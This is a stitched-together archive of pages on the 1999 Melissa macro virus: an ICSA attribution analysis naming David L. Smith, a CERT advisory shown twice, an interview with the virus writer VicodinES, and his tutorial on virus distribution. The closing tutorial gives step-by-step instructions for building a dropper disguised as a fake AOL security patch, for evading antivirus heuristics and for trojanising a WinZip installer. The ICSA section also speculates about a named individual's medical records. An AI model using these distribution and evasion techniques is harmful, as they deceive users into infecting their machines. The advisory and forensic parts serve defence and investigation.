<p><br>
  <b><i>Conclusions</i></b><br>
  ICSA's analysts believe David L. SMITH is probably the virus writer VicodinES. 
  We offer our analysis to help focus investigators. Forensic analysis of computers 
  SMITH had access to may be useful in conjunction with our analysis. Our analysis 
  relies on USENET posts developed by searching Dejanews, our own data collected 
  from the computer underground and by analysis of the viruses involved. We recognize 
  the analysis is neither conclusive nor can it be attributed to anyone with absolute 
  confidence. However our analysis may assist the finder of fact in establishing 
  the &quot;scene&quot; SMITH was involved in. Presuming SMITH is VicodinES, he 
  may be culpable for offenses in addition to those associated with the Melissa 
  virus.<br>
  Roger Thompson, Director of Vendor Labs, has analyzed the Global Unique Identifier 
  (GUID) of the Melissa macro virus and other macro viruses that VicodinES has 
  acknowledged authoring. The GUID is consistent with the same person authoring 
  Melissa as other macro viruses such as Class.A.poppy.<br>
  Our analysis of SMITH's and VicodinES's posts to USENET have found three chief 
  nodes in common, posts to the group nj.test, affinity to the Russian anti-virus 
  program, AVP and promotion of a web site for a category of music, the Industrial 
  Information Station.</p>
<p><br>
  <b><i>Unresolved Questions</i></b></p>
<p><br>
  Records for at least four other America Online (AOL) screennames could be checked. 
  SMITH appears to have posted to USENET groups from at least five different AOL 
  accounts. According to press reports, at least one of these was usurped from 
  another, legitimate, AOL subscriber skyroket@aol.com . For example, on 8/4/96 
  VicodinD@aol.com posted to rec.drugs a message in which he wrote he was changing 
  his screename from PainfullD@aol.com, begging the question what happened to 
  the PainfullD account, was it illicit, discovered and deleted by it's legitimate 
  owner?<br>
  SMITH's employer(s) should be interviewed to determine what companies allowed 
  SMITH access to their systems. To post to USENET, SMITH appears to have used 
  systems owned or registered to J.P. Morgan, AT&amp;T and Hoffman-LaRoche, all 
  listed as clients of CGS Computer Associates. These uses may be violations of 
  18 USC 1030 or similar state statutes. These firms may have a civil interest 
  in SMITH's use of their systems as well.<br>
  Records of SMITH's health care may reveal circumstantial evidence that when 
  considered in context are incriminating. Specifically records of prescriptions 
  for Vicodin ES, other pain killers and prescription drugs.</p>

  <b><font size="+2">Melissa Virus<br>
  </font>From CERT Advisory 99.04:</b></p>
<p><b><i>Overview:</i></b><br>
  At approximately 2:00 PM GMT-5 on Friday March 26 1999 we began receiving reports 
  of a Microsoft Word 97 and Word 2000 macro virus which is propagating via email 
  attachments. The number and variety of reports we have received indicate that 
  this is a widespread attack affecting a variety of sites.<br>
  Our analysis of this macro virus indicates that human action (in the form of 
  a user opening an infected Word document) is required for this virus to propagate. 
  It is possible that under some mailer configurations, a user might automatically 
  open an infected document received in the form of an email attachment. This 
  macro virus is not known to exploit any new vulnerabilities. While the primary 
  transport mechanism of this virus is via email, any way of transferring files 
  can also propagate the virus.<br>
  Anti-virus software vendors have called this macro virus the Melissa macro or 
  W97M_Melissa virus.<br>
  In addition to this advisory, please see the Melissa Virus FAQ (Frequently Asked 
  Questions) document available at:<br>
  http://www.cert.org/tech_tips/Melissa_FAQ.html</p>
<p><b><i><font size="+2">I. Description of the Melissa Virus</font></i></b></p>
<p>The Melissa macro virus propagates in the form of an email message containing 
  an infected Word document as an attachment. The transport message has most frequently 
  been reported to contain the following Subject header</p>
<blockquote>
  <p>Subject: Important Message From &lt;name&gt;</p>
</blockquote>
<p>Where &lt;name&gt; is the full name of the user sending the message.</p>
<p>The body of the message is a multipart MIME message containing two sections. 
  The first section of the message (Content-Type: text/plain) contains the following 
  text.</p>
<blockquote>
  <p>Here is that document you asked for ... don't show anyone else ;-)</p>
</blockquote>
<p>The next section (Content-Type: application/msword) was initially reported 
  to be a document called &quot;list.doc&quot;. This document contains references 
  to pornographic web sites. As this macro virus spreads we are likely to see 
  documents with other names. In fact, under certain conditions the virus may 
  generate attachments with documents created by the victim.</p>
<p>When a user opens an infected .doc file with Microsoft Word97 or Word2000, 
  the macro virus is immediately executed if macros are enabled.</p>
<p>Upon execution, the virus first lowers the macro security settings to permit 
  all macros to run when documents are opened in the future. Therefore, the user 
  will not be notified when the virus is executed in the future.</p>
<p>The macro then checks to see if the registry key</p>
<blockquote>
  <p>&quot;HKEY_Current_User\Software\Microsoft\Office\Melissa?&quot;</p>
</blockquote>
<p>has a value of &quot;... by Kwyjibo&quot;. If that registry key does not exist 
  or does not have a value of &quot;... by Kwyjibo&quot;, the virus proceeds to 
  propagate itself by sending an email message in the format described above to 
  the first 50 entries in every Microsoft Outlook MAPI address book readable by 
  the user executing the macro. Keep in mind that if any of these email addresses 
  are mailing lists, the message will be delivered to everyone on the mailing 
  lists. In order to successfully propagate, the affected machine must have Microsoft 
  Outlook installed; however, Outlook does not need to be the mailer used to read 
  the message.</p>
<p>This virus can not send mail on systems running MacOS; however, the virus can 
  be stored on MacOS.</p>
<p>Next, the macro virus sets the value of the registry key to &quot;... by Kwyjibo&quot;. 
  Setting this registry key causes the virus to only propagate once per session. 
  If the registry key does not persist through sessions, the virus will propagate 
  as described above once per every session when a user opens an infected document. 
  If the registry key persists through sessions, the virus will no longer attempt 
  to propagate even if the affected user opens an infected document.</p>
<p>The macro then infects the Normal.dot template file. By default, all Word documents 
  utilize the Normal.dot template; thus, any newly created Word document will 
  be infected. Because unpatched versions of Word97 may trust macros in templates 
  the virus may execute without warning. For more information please see:</p>
<blockquote>
  <p>http://www.microsoft.com/security/bulletins/ms99-002.asp</p>
</blockquote>
<p>Finally, if the minute of the hour matches the day of the month at this point, 
  the macro inserts into the current document the message &quot;Twenty-two points, 
  plus triple-word-score, plus fifty points for using all my letters. Game's over. 
  I'm outta here.&quot;</p>
<p>Note that if you open an infected document with macros disabled and look at 
  the list of macros in this document, neither Word97 nor Word2000 list the macro. 
  The code is actually VBA (Visual Basic for Applications) code associated with 
  the &quot;document.open&quot; method. You can see the code by going into the 
  Visual Basic editor.</p>
<p>If you receive one of these messages, keep in mind that the message came from 
  someone who is affected by this virus and they are not necessarily targeting 
  you. We encourage you to contact any users from which you have received such 
  a message. Also, we are interested in understanding the scope of this activity; 
  therefore, we would appreciate if you would report any instance of this activity 
  to us according to our Incident Reporting Guidelines document available at:</p>

  <b><i><a href="ivvicodn.htm">VDAT/Cicatrix Interview (August 97)</a></i></b></p>
<p><br>
  An August 1997 &quot;interview&quot; of the virus author VicodinES by &quot;Cicatrix&quot; 
  published in the virus exchange group VDAT reveals several details that point 
  towards David L. SMITH. VicodinES states he was 14 or 15 years of age when his 
  father purchased a TI-99 4/A computer. These computers were popular in the mid-80's 
  making VicodinES' year of birth somewhere near 1970 and thus his present age 
  would be about 30. He became involved in the virus scene because he was bored 
  and high on prescription painkillers.<br>
  When asked why he names his viruses &quot;poppy,&quot; he replies, &quot;They 
  all end in .Poppy because I am a pill-head and all the good pills come from 
  the poppy plant!&quot;<br>
  He admits to being part of &quot;The Narkotic Network,&quot; and there are three 
  person in the network, Klonopin.Jones, and Fastin.Blee.<br>
  When asked how he came by the handle &quot;VicodinES,&quot; he answered, &quot;VicodinES 
  is a the name for a painkiller here in the US. It's actually Vicodin Extra Strength. 
  I love those little fucking pills so I took that name. It's just Hydrocodone 
  and Tylanol. Anyway I was very high on the little bastards when I decided to 
  start writing virii so I thought it was appropriate.&quot;<br>
  In the interview, he states he prefers the anti-virus program AVP.<br>
  He claims the e-mail address &quot; vcru@hotmail.com.&quot; A check of Dejanews 
  revealed 33 posts with this address all to alt.binaries.pictures.erotica with 
  the name Dan Johnson. Our analysis does not include this as a significant alias 
  with regard to viruses.<br>
  In the interview he also acknowledges several entities that will occur again, 
  specifically: Monkey, Mousey and The Woobie, Klonopin Jones and Fastin.Blee.</p>
<p><br>
  <b><i>Klonopin.Jones</i></b></p>
<p><br>
  <b>Klonopin Jones</b> jones@thermal1.fiu.edu posted to rec.music.industrial 
  on 10/5/95 with his mailer setting including &quot;Organization: Industrial 
  Information Station&quot; and the name &quot;Kinzy Jones Jr.&quot; at Florida 
  International University. N.B. Klonopin is a proprietary anti-anxiety drug<br>
  VicodinES used the alias vic@klonopin.com to post to alt.comp.virus on 10/18/97. 
  Klonopin is a domain registered to Hoffman-LaRoche. Hoffman-LaRoche is listed 
  on a web page of David L. SMITH's employer, CGS Computer Associates. If this 
  address was legitimate, it may indicate SMITH was using Hoffman-LaRoche systems 
  illicitly.</p>

  SMITH seldom posted to USENET from more than one identity on any given day. 
  For those posts that originated from other than America Online, it appears that 
  SMITH's prefered news client is Netscape Navigator/Communicator. The pattern 
  of changes to his alias is consistent with choosing an alias for a day or some 
  other time period and not changing mid-session. Changing the identity in Netscape 
  is relatively straightforward, but sufficiently complicated that making frequent 
  changes would be time-consuming.</p>

  CERT Advisory CA-99-04-Melissa-Macro-Virus</p>
<p>Original issue date: Saturday March 27 1999<br>
  Last Revised: Saturday March 27, 1999</p>
<p>Systems Affected</p>
<p>* Machines with Microsoft Word 97 or Word 2000<br>
  * Any mail handling system could experience performance problems or a denial 
  of service as a result of the propagation of this macro<br>
  virus.</p>
<p>Overview</p>
<p>At approximately 2:00 PM GMT-5 on Friday March 26 1999 we began receiving reports 
  of a Microsoft Word 97 and Word 2000 macro virus which is propagating via email 
  attachments. The number and variety of reports we have received indicate that 
  this is a widespread attack affecting a variety of sites.</p>
<p>Our analysis of this macro virus indicates that human action (in the form of 
  a user opening an infected Word document) is required for this virus to propagate. 
  It is possible that under some mailer configurations, a user might automatically 
  open an infected document received in the form of an email attachment. This 
  macro virus is not known to exploit any new vulnerabilities. While the primary 
  transport mechanism of this virus is via email, any way of transferring files 
  can also propagate the virus.</p>
<p>Anti-virus software vendors have called this macro virus the Melissa macro 
  or W97M_Melissa virus.</p>
<p><b>I. Description</b></p>
<p>The Melissa macro virus propagates in the form of an email message containing 
  an infected Word document as an attachment. The transport message has most frequently 
  been reported to contain the following Subject header</p>
<blockquote>
  <p>Subject: Important Message From &lt;name&gt;</p>
</blockquote>
<p>Where &lt;name&gt; is the full name of the user sending the message.</p>
<p>The body of the message is a multipart MIME message containing two sections. 
  The first section of the message (Content-Type: text/plain) contains the following 
  text.</p>
<blockquote>
  <p>Here is that document you asked for ... don't show anyone else ;-)</p>
</blockquote>
<p>The next section (Content-Type: application/msword) was initially reported 
  to be a document called &quot;list.doc&quot;. This document contains references 
  to pornographic web sites. As this macro virus spreads we are likely to see 
  documents with other names. In fact, under certain conditions the virus may 
  generate attachments with documents created by the victim.</p>
<p>When a user opens an infected .doc file with Microsoft Word97 or Word2000, 
  the macro virus is immediately executed if macros are enabled.</p>
<p>Upon execution, the virus first lowers the macro security settings to permit 
  all macros to run when documents are opened in the future. Therefore, the user 
  will not be notified when the virus is executed in the future.</p>
<p>The macro then checks to see if the registry key </p>
<blockquote>
  <p>&quot;HKEY_Current_User\Software\Microsoft\Office\Melissa?&quot;</p>
</blockquote>
<p>has a value of &quot;... by Kwyjibo&quot;. If that registry key does not exist 
  or does not have a value of &quot;... by Kwyjibo&quot;, the virus proceeds to 
  propagate itself by sending an email message in the format described above to 
  the first 50 entries in every MAPI address book readable by the user executing 
  the macro. Keep in mind that if any of these email addresses are mailing lists, 
  the message will be delivered to everyone on the mailing lists. In order to 
  successfully propagate, the affected machine must have Microsoft Outlook installed; 
  however, Outlook does not need to be the mailer used to read the message.</p>
<p>Next, the macro virus sets the value of the registry key to &quot;... by Kwyjibo&quot;. 
  Setting this registry key causes the virus to only propagate once per session. 
  If the registry key does not persist through sessions, the virus will propagate 
  as described above once per every session when a user opens an infected document. 
  If the registry key persists through sessions, the virus will no longer attempt 
  to propagate even if the affected user opens an infected document.</p>
<p>The macro then infects the Normal.dot template file. By default, all Word documents 
  utilize the Normal.dot template; thus, any newly created Word document will 
  be infected. Because unpatched versions of Word97 may trust macros in templates 
  the virus may execute without warning. For more information please see:</p>
<blockquote>
  <p>http://www.microsoft.com/security/bulletins/ms99-002.asp</p>
</blockquote>
<p>Finally, if the minute of the hour matches the day of the month at this point, 
  the macro inserts into the current document the message &quot;Twenty-two points, 
  plus triple-word-score, plus fifty points for using all my letters. Game's over. 
  I'm outta here.&quot;</p>
<p>Note that if you open an infected document with macros disabled and look at 
  the list of macros in this document, neither Word97 nor Word2000 list the macro. 
  The code is actually VBA (Visual Basic for Applications) code associated with 
  the &quot;document.open&quot; method. You can see the code by going into the 
  Visual Basic editor.</p>
<p>If you receive one of these messages, keep in mind that the message came from 
  someone who is affected by this virus and they are not necessarily targeting 
  you. We encourage you to contact any users from which you have received such 
  a message. Also, we are interested in understanding the scope of this activity; 
  therefore, we would appreciate if you would report any instance of this activity 
  to us according to our Incident Reporting Guidelines document available at:</p>
<blockquote>
  <p>http://www.cert.org/tech_tips/incident_reporting.html</p>
</blockquote>
<p><b>II. Impact</b></p>
<p>* Users who open an infected document in Word97 or Word2000 with macros enabled 
  will infect the Normal.dot template causing any documents referencing this template 
  to be infected with this macro virus. If the infected document is opened by 
  another user, the document, including the macro virus, will propagate. Note 
  that this could cause the user's document to be propagated instead of the original 
  document, and thereby leak sensitive information.</p>
<p>* Indirectly, this virus could cause a denial of service on mail servers. Many 
  large sites have reported performance problems with their mail servers as a 
  result of the propagation of this virus.</p>
<p><b>III. Solutions</b></p>
<p>* Block messages with the signature of this virus at your mail transfer agents.</p>
<p>With Sendmail</p>
<p>Nick Christenson of sendmail.com provided information about configuring sendmail 
  to filter out messages that may contain the Melissa virus. This information 
  is available from the follow URL:</p>
<blockquote>
  <p> ftp://ftp.cert.org/pub/cert_advisories/Patches/CA-99-04-sendmail-melissa-filter.txt</p>
</blockquote>
<p>* Utilize virus scanners</p>
<p>Most virus scanning tools will detect and clean macro viruses. In order to 
  detect and clean current viruses you must keep your scanning tools up to date 
  with the latest definition files.</p>

<p>* Encourage users at your site to disable macros in Microsoft Word</p>
<p>Notify all of your users of the problem and encourage them to disable macros 
  in Word. You may also wish to encourage users to disable macros in any product 
  that contains a macro language as this sort of problem is not limited to Microsoft 
  Word.</p>
<p>In Word97 you can disable automatic macro execution (click Tools/Options/General 
  then turn on the 'Macro virus protection' checkbox). In Word2000 macro execution 
  is controlled by a security level variable similar to Internet Explorer (click 
  on Tools/Macro/Security and choose High, Medium, or Low). In that case, 'High' 
  silently ignores the VBA code, Medium prompts in the way Word97 does to let 
  you enable or disable the VBA code, and 'Low' just runs it.</p>
<p>Word2000 supports Authenticode on the VB code. In the 'High' setting you can 
  specify sites that you trust and code from those sites will run.</p>

  <b><font size="+1">Appendix 2 VicodinES-Cicatrix Interview</font></b></p>
<p><br>
  <b><i>Interview with VicodinES (1997) (emphasis added by ICSA)</i></b></p>
<p>by Cicatrix</p>
<p><b><i>[IS/Recon Note:</i></b> from html publication produced by computer virus 
  exchange group VDAT August 1997 <b><i>Boldface emphasis is ours indicating significant 
  data in the interview.]</i></b></p>
<p>How did you start out in computers?</p>
<p><b><i>I was 14 or 15 and my dad purchased a TI-99 4/A</i></b> and I started 
  teaching myself BASIC. Programs were loaded with a cassette tape :) A buddy 
  of mine had one with a modem and we used to call all these bbs's long distance 
  on stolen calling card numbers. We would read sex stories, curse out people 
  on &quot;the war boards&quot; and download files on how to make bombs and such. 
  The time-frame here was like 1982? Maybe a bit later. I also ran a small bbs 
  for a time called &quot;The Electric Death BBS&quot; on a very early Compaq 
  Lugable (fucking thing must have been 30 pounds) ... it was around the same 
  time.</p>
<p>How and when did you start out in the virus scene?</p>
<p><b><i>Hmmm, honestly I was bored, really high on prescription painkillers (purchased 
  not prescribed) and I decided to do some assembly programming again.</i></b></p>
<p>Have you written viruses? If so which would you like to take credit for?</p>
<p>Yes I write virii and I don't want to take any credit for the massively hacked 
  virii that I stuck a bunch of AOL'ers with. Beta's are a bitch! Ummm I will 
  take credit for anything that infected your system, even if I didn't program 
  it. If it annoyed you then I want credit for it :)</p>
<p>How do you name your viruses?</p>
<p><b><i>They all end in .Poppy because I am a pill-head and all the good pills 
  come from the poppy plant! Why? Why not? They all get their first names by accident.</i></b></p>
<p>Which programming languages do you know?</p>
<p>I took COBOL in high school but I forgot most of it. I know Modula and Pascal. 
  I also do ok in Assembly and C++. I am working on my Visual C++ skills right 
  now because I have a really good idea for my next virus ;)</p>
<p>What programming language do you like using the most?</p>
<p>They all suck!</p>
<p>Are you a member of a VX group?</p>
<p><b><i>I am part of The Narkotic Network. There is just three of us.</i></b></p>
<p>Which AV software do you like/respect the most? Which the least?</p>
<p><b><i>I use AVP the most so I guess I like that the best.</i></b> I have a 
  copy of every AV product on my hd so I can keep track of what programs can find 
  what virii and to cross check my work. I don't really hate any of them - I don't 
  have emotional attachments to any AV products.... I take that back I LOVE the 
  ones that still can find my virii!</p>
<p>What are your goals (VX wise)?</p>
<p>To annoy countless users worldwide.</p>
<p>What is your view on the continuous 'war' between VX and AV.</p>
<p>Don't really know much about it.</p>
<p>Where did you get you handle? What does it mean?</p>
<p><b><i>VicodinES is a the name for a painkiller here in the US. It's actually 
  Vicodin Extra Strength. I love those little fucking pills so I took that name. 
  It's just Hydrocodone and Tylanol. Anyway I was very high on the little bastards 
  when I decided to start writing virii so I thought it was appropriate.</i></b></p>
<p>What is your view on Virus Creation software (eg. VCL, PS-MPC etc.)?</p>
<p>I played with NuKE NRLG and PS G2. I thought they were pretty cool. I liked 
  the basic idea behind DREG - I never got a copy of the program (basically never 
  bothered to download it) but I liked they whole philosophy behind it.</p>
<p>What is your view on macro viruses vs. assembly or HLL viruses?</p>
<p>Macro's are cool by me. I think sometimes it's way too easy to create a new 
  variant of a macro but I have seen some that really impressed me. I won't ever 
  write one but that's my preference. HLL virii are the way to go. You can really 
  kick some fucking ass with a C++ virii in 95 - just wait, you will see. I have 
  also heard that someone is working on Microsoft Scripting virii? Kinda like 
  batch virii in 95 .. but I haven't seen anything yet.</p>
<p>Have you ever confirmed one of your viruses 'in-the-wild'?</p>
<p>Too early to tell for me. Though I do have confirmation of 300+ people downloading 
  an infected WinZip of mine. It was a carrier of Skim.Poppy so I suspect that 
  one will do me proud. Hey Joe Wells get used to typing the word &quot;POPPY&quot; 
  :)</p>
<p>Which VX E-zine do you like to most? Which the least?</p>
<p>I like 40 Hex - I re-read them now and again. The best new one is Xine. 29A 
  is also cool.</p>
<p>Which individual or what group do you like/respect in the VX world?</p>
<p>I don't know any. I only respect those that helped me with or without knowing. 
  People like Polt from the WCIVR and Cicatrix also AV'ers like Eugene Kaspersky 
  who answered my questions without bias.</p>
<p>In the AV world?</p>
<p>see above</p>
<p>Which individual or what group do you like/respect outside the VX or the AV 
  world?</p>
<p>I like UPS in warez!! Fuckin' BIG UP'S FELLAZ! I also thought Da Chronic was 
  amazing with AOHell. It's a simple thing now but unheard of when it came out. 
  AOHell was even in Newsweek. New ideas don't need to be complex to gain my respect 
  they just have to work. Da Chronic deserves much credit!</p>
<p>What is your view on destructive payloads in viruses?</p>
<p>Counter productive.</p>
<p>Do you think there is such a thing as a 'good' virus?</p>
<p>All mine are good, I don't understand the question :)</p>
<p>What do you do in 'real' life?</p>
<p>I run the MIS dept. for a large engineering firm (I only run one location though) 
  and I am industrial music artist on the side. You may one day own one of my 
  cd's.</p>
<p>Do people outside the VX scene know what you do (parents, girlfriend etc.)?</p>
<p>Not many - I don't invite people to judge my actions.</p>
<p>Do you do other computer stuff outside VX (Hacking, phreaking, warez etc.)?</p>
<p>I dabble in warez. Fastin.Blee does more warez than I do. He keeps me in the 
  scene.</p>
<p>Should viruses be illegal? Is there a difference between creation and spreading?</p>
<p>I don't think in those terms. I am not governed by other peoples morals. I 
  wouldn't really take any heed in any laws. I would be forced to if it directly 
  affected me but until it does I won't waste time on debating those issues with 
  anyone or myself.</p>
<p>Describe the perfect virus.</p>
<p>I would end up spouting off &quot;the one that was never caught&quot; clich&eacute; 
  here so I will pass.</p>
<p>What is your view on Windows (95)</p>
<p>Undiscovered country. Do yourself a favor and buy Andrew Schulman's &quot;Unauthorized 
  Windows 95 Developer's Resource Kit&quot; - I am a big fan of GUI. I started 
  in a text only world and I have no problems seeing it go away.</p>
<p>What is your advice for people just starting out?</p>
<p>I am not a good one for advice. Too selfish and sarcastic to be taken at face 
  value, sorry.</p>
<p>Where can you be reached if at all?</p>
<p>vcru@hotmail.com</p>
<p>Any greets?</p>
<p>Yea shouts out to <b><i>Klonopin.Jones, Fastin.Blee,</i></b> Flexoral.DeZego, 
  DeadPete, Mudcat &quot;Grave&quot; Rose, <b><i>Monkey, Mousey and The Woobie!</i></b></p>
<p>Any other comments?</p>
<p>Yes my Turn-On's are skinny little blonde chicks with straight hair, very strong 
  thuderstorms and getting free painkillers. Oh and one other thing don't think 
  you can invite me over to your house without me searching your bathroom medicine 
  cabinet for painkillers. I will steal them, you can count on that.</p>
<p>Short responses to the following names or words:<br>
  - Dark Avenger - created MtE right? If so then he rules!<br>
  - Dark Angel - some virus guy who followed the rules and took a &quot;spooky&quot; 
  name just like all the other sheep. What his accomplishments are I have no idea.<br>
  - Sarah Gordon - Isn't she the queen of misinformation? I could be wrong here.<br>
  - Fridrik Skulason - AV guy from Iceland<br>
  - many fat chicks come from Iceland<br>
  - I have seen Bj&ouml;rk's tits and she has nasty ones<br>
  - ugggh don't go to Iceland<br>
  - Alan Solomon - AV guy from DSAV - name makes me think he is fat.<br>
  - WordBasic/VBA - cross-platform virii courtesy of Bill Gates<br>
  - VDAT - I dig it<br>
  - VSUM - loads of mistakes - bad source of information<br>
  - Assembler - not a good language for 95 virii<br>
  - NuKE - A group who I think are cool<br>
  - Phalcon Skism - I really don't know the difference between any of the groups 
  but I think these guys did a good job with G2<br>
  - VLAD - I have borrowed some ideas from these ingenious fellows<br>
  - I give you credit here and on my website.<br>
  - Trident - some poly engine right?<br>
  - Polymorphic - waste of time - just don't get detected in the first place<br>
  - Stealth - waste of time in 95 - no one uses TBAV in the US anyway so I don't 
  bother to think about stealth<br>
  - I hate...... &lt;list too long to print&gt;<br>
  - I love...... <b><i>chocolate ice cream pops from Shop Rite</i></b> and a 2 
  liter of Diet Mountain Dew on an empty stomach<br>
  - IRC - crap - who wants to chat while they are on a computer anyway - fucking 
  waste of time<br>
  - Sex - not as big of a driving force as in my life as it seems to be for others 
  but I love to fuck when I get the chance<br>
  How and why did you get TNN started?</p>
<p><b><i>I told these two other guys (Klonopin.Jones + Fastin.Blee) who were helping 
  me distribute, debug and design virii that they were now in a group and they 
  didn't argue - so The Narkotic Network was born.</i></b></p>
<p>How is TNN organized?</p>
<p>Honestly there isn't much to be organized. I just kinda do what I want with 
  it.</p>
<p>How are your other tutorials coming along?</p>
<p>I have mixed feelings on tutorials. I don't deny the fact that I have learned 
  a TON from tutorials but I'm not so sure I am that comfortable giving away all 
  my ideas. I may not write any more tutorials. I have noticed a few errors in 
  my first tutorial anyway and I can't deal with the constant proof reading I 
  do in my head after I post my ideas.</p>
<p>Will you ever release a virus creator?</p>
<p>I don't have that much free time. I divide my free time between programming 
  and music. I have a computer dedicated to the internet and virii and one dedicated 
  to running my samplers, drum machines and syths.</p>
<p>What is in your future and the future of TNN?</p>
<p>I want to turn the Narkotic Network web site into a a site where I ask total 
  strangers to send me all the drugs in their medicine cabinet. But, I don't think 
  I can get away with that. I really want to do that but I don't want to risk 
  it all and get caught! I guess we will just keep moving forward with more complex 
  virii and maybe more information. I will probably even relocate when GeoShitties 
  kills the site.</p>
<p>Will TNN increase the number of members?</p>
<p>I don't really know. The Vx culture moves very slow and seems to communicate 
  very little (I have made attempts to cross pollinate with very little success) 
  so for right now three members is as good as it gets. I also tried to get on 
  #virii once to &quot;hang&quot; but I didn't have my IRC setup to +o super-dork 
  access so no chat for me.</p>
<p>Will TNN go into other scenes except VX? (hacking, etc.)</p>
<p>We actually move a lot of warez. If you're into virii you gotta think about 
  distribution and if we stay up on whats hot then we can infect you when you 
  least expect it!</p>

    <a href="tumisc30.htm">Theory Of Better File Virus Distribution</a><br>
    (a study in new ideas?)
  </center>
</p>
<p>Ok so you managed to get over your first hurdle, you managed to make/hack/remix 
  a memory resident *.com file infecting virus. Congratulations! I mean that wholeheartedly. 
  So now what? Did you spend all that time learning and debugging .asm files just 
  so it would sit on your HD? No? I didn't think so. So what's your next move? 
  DISTRIBUTION!</p>
<p>The first rule of distribution for a file infector is demand. You must create 
  a demand or use a program that is in demand as a host. Without demand your file 
  will never be downloaded or run.<br>
  Second, deception! You must be able to get your virus past most AV products 
  or you will never get a chance to infect. How is your code? Can you sneak by 
  heuristics? You will need a way to sneak your virus passed the most common AV 
  programs, even if you're heuristically challenged. Can that be done? Yes, a 
  clever dropper can do that. How? .... read on.<br>
  Third, infection! Infect on the first run! This also requires a Decently clever 
  dropper. What good is a memory resident *.com infecting virus if it's run and 
  then no .com files are run the entire time it's resident. Then *poof* someone 
  shuts off the computer and never runs your dropper again? That would be fine 
  if you had written a multipartite virus but for this first example we are concentrating 
  on a beginners virus, a basic *.com memory resident file infector.</p>
<p>Ok so I say that Virus Distribution consists of three basic components:<br>
  DEMAND, DECEPTION and INFECTION. Am I right? Is this a sound theory? Well let 
  me back up my theory with an example or two.</p>
<p>&nbsp;</p>
<p>EXAMPLE #1:<br>
  The Virus: *.com memory resident file infector. (virus.com)<br>
  Tools Needed: Tlink, Bat2exe, the virus.obj file (you can find Bat2exe<br>
  from filez.com if you don't already have it and you must already have Tlink 
  and<br>
  the .obj file if you wrote the virus!)</p>
<p>Ok so you have everything you need and you're just dying to infect the world. 
  Ok, give it some thought. Think &quot;DEMAND.&quot; In this example we will 
  capitalize on a current issue and create demand. In this case we dream up an 
  &quot;AOL IE 3.0 Security Patch&quot; and our method of distribution will be 
  AOL and USENET. You see, I have already done this. When AOL had their big crash 
  I created an Anti-Crash &quot;AOL Approved&quot; Downloadable Patch. You say 
  no one would ever fall for that :) .. yea right! So I just retooled that idea 
  for &quot;right now&quot; - AOL only came out with a patch for their IE integrated 
  browser on 7-7-97 :) .... Anticipate demand, create demand or capitalize on 
  demand. Ok so now everyone who uses AOL will want to be secure, and you have 
  made a program that is in demand. With demand out of the way we need to concentrate 
  on deception. Now, most computer users are not that bright but they know better 
  than to just run a .bat file - hell I have even heard that some computer users 
  even know how to view .bat files and look for suspicious content! So we will 
  hide our .bat file in a .com. (realistically though your chance won't drop that 
  much if you just leave it as a .bat)</p>
<p>Ok lets make that dropper!</p>
<p>1. Rename tlink.exe to patch.exe<br>
  2. Rename virus.obj to patch.obj<br>
  3. Create a nice descriptive .doc or readme.txt file to calm the user's<br>
  nerves.<br>
  4. Create a .bat file that acts like your file description.<br>
  aol_ie.bat :<br>
  cls<br>
  echo Press any key to update your Internet Explorer For<br>
  America Online<br>
  pause&gt;nul<br>
  patch /t patch.obj ;link the virus<br>
  patch ;run the virus<br>
  command ;call command.com for infection<br>
  5. bat2exe your aol_ie.bat - it will result in aol_ie.com [you can skip<br>
  this part if you have to]<br>
  6. Package your files into a nice .zip or if you want you can use a self<br>
  extracting compression program but use one with an icon!! (WinZip or <br>
  RAR) [icons calm new computer user's nerves!]</p>
<p>So your zip will contain :<br>
  patch.exe [why did you rename tlink.exe? patch goes with the flow better than 
  tlink.exe<br>
  and will not arouse suspicion]<br>
  patch.obj [why did you rename virus.obj? also goes with the flow better]<br>
  aol_ie.com [the dropper .bat converted to .com]<br>
  readme.txt [be creative here!!]</p>
<p>*** [EXTRA] Take it a bit further! . If you want to you can add a few extra 
  steps like creating a .pif for your .com [or .bat] or by including a hidden 
  .ico or .dll file to go along with your .pif . use your imagination ***</p>
<p>*** [EXTRA] Take it a bit further! ... You can also fatten up your zip with 
  miscellaneous files of varying size renamed to patch.dat or something equally 
  innocuous ***</p>
<p>*** [Snag?] Did we hit a snag? . What if they view these files with a hex editor 
  or text editor? No problem - all they will see is the inside of tlink.exe or 
  some commands in aol_ie.com like patch and pause, certainly nothing to be alarmed 
  about :) ***</p>
<p>So is the deception complete? More than you may realize. They downloaded your 
  zip and scanned it. They did a deep or heuristic scan!!! Are you worried? Should 
  you worry because your virus is heuristically challenged? Not really - you have 
  a 75% better chance of beating heuristics in .obj form :) ... don't believe 
  me? Test that one yourself. Also your aol_ie.com has the pause command in it. 
  What virus pauses before it infects? Do you know of one? It doesn't make logical 
  sense ... that's why we do it.</p>
<p>Finally, we need instant infection. Wait, that's already done. Did you catch 
  it? The third to last line in our bat links the viral code and creates the actual 
  virus. The second to last line runs our virus which, in turn goes memory resident. 
  Then the last line of our very simple dropper runs command.com. We just went 
  memory resident and then got command.com! Hell that means that even if our user 
  has Win95 we still get a chance to go active every time they invoke a DOS Prompt 
  or Shut Down To DOS. Also our heuristically challenged virus wasn't even created 
  until after the download was scanned and no current AV programs (that I know 
  of) support heuristics in their memory esident<br>
  scanner!</p>
<p>So in example #1 I demonstrated how some thought and ingenuity combined with 
  my theory of &quot;Better Distribution&quot; can increase your chances of infecting 
  a new machine and spreading. Example #1 only deals with a very simple virus 
  and limited targets (how many .com files can you find on your system?) ... but 
  our mission was to increase the chances of infection and survival and we did 
  that 10 fold!!</p>
<p>Ok, do you subscribe to my theory of Better Distribution yet? No? I'll try 
  once again with a more complex virus and a totally different angle, but sticking 
  to the main points of my theory : DEMAND, DECEPTION and INFECTION!</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>EXAMPLE #2:<br>
  The Virus: *.exe (Windows EXE) non-memory resident file infector.<br>
  (virus.exe)<br>
  Tools Needed: A current or new beta release of a popular Windows program.</p>
<p>Ok let's start! Mission number one? DEMAND! For this example let's use the 
  latest greatest release of WinZip (beta or otherwise). That should take care 
  of demand - everyone wants a new FREE version of WinZip. It's a good universal 
  program to use just like pkzip was a few years ago.</p>
<p>As you just saw demand takes care of itself if you just put a little thought 
  into it. Lets see if DECEPTION will do the same thing. How do you infect WinZip? 
  Well, since this a more advanced example I will just assume that I don't have 
  to show you how to infect a file. But, I will tell you to test your work! Think! 
  The WinZip setup program is a lot more complex than any dropper .bat file we 
  can construct so be sure to test your infection. For example I have done the 
  WinZip thing and the Setup.exe for the 16bit WinZip has to have the exact same 
